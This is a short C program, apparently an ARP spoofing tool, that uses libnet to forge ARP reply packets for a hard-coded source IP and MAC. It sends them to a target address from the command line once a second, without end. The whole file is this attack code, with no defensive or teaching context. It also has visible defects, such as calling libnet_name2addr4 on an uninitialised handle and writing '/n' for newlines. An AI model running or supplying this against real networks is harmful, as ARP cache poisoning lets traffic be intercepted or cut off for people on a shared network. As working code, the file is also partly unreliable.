#include <stdio.h>
#include <libnet.h>
void usage(){
    printf("usage: sudo ./arp dst_ip");
}
int main(int argc, char * argv[])
{
    int res;
    /*********init paras*****************/
    libnet_t *l;/*****libnet handler*/
    libnet_ptag_t p_tag;
    char *device="enp0s5";
    char err_buff[LIBNET_ERRBUF_SIZE];
    char *src_ip_str="192.168.152.160";
    char *dest_ip_str="192.168.152.129";
    if (argc != 2){usage();}
    u_char src_mac[6]={0x00,0x1c,0x42,0x50,0xad,0xb0};
    u_char dest_mac[6]={0x11,0x11,0x11,0x11,0x11,0x11};
    u_long src_ip;
    u_long dest_ip;
    src_ip=libnet_name2addr4(l,src_ip_str,LIBNET_RESOLVE);
    dest_ip=libnet_name2addr4(l,argv[1],LIBNET_RESOLVE);
    /**********init libnet*****************/
    l=libnet_init(
        LIBNET_LINK_ADV,
        device,
        err_buff
    );
    if(l==NULL)
    {
        printf("libnet_init err!/n");
        fprintf(stderr,"%s",err_buff);
        exit(0);
    }
    /**********build arp packet************/
    p_tag=libnet_build_arp(
        ARPHRD_ETHER,/*hardware type ethernet*/
        ETHERTYPE_IP,/*protocol type*/
        6,/*length of mac*/
        4,/*length of IP*/
        ARPOP_REPLY,/*ARP operation type*/
        src_mac,
        (u_int8_t*) &src_ip,
        dest_mac,
        (u_int8_t*) &dest_ip,
        NULL,/*payload*/
        0,/*payload size*/
        l,/*libnet handler*/
        0/*'0' stands out building a new packet*/
    );
    if(p_tag==-1)
    {
        printf("libnet_build_arp err!/n");
        exit(0);
    }
    /***********build ethernet packet header*************/
    p_tag=libnet_build_ethernet(
        dest_mac,
        src_mac,
        ETHERTYPE_ARP,
        NULL,
        0,
        l,
        0
    );
    if(p_tag==-1)
    {
        printf("libnet_build_ethernet err!/n");
        exit(0);
    }
    /*********send packets*******************************/
    for(;;)
    {
        if((res=libnet_write(l))==-1)
        {
            printf("libnet_write err!/n");
            exit(0);
        }
        printf("arp packet has been sent\n");
	sleep(1);
    }
    /*********over and destroy**************************/
    libnet_destroy(l);
    return 0;
}
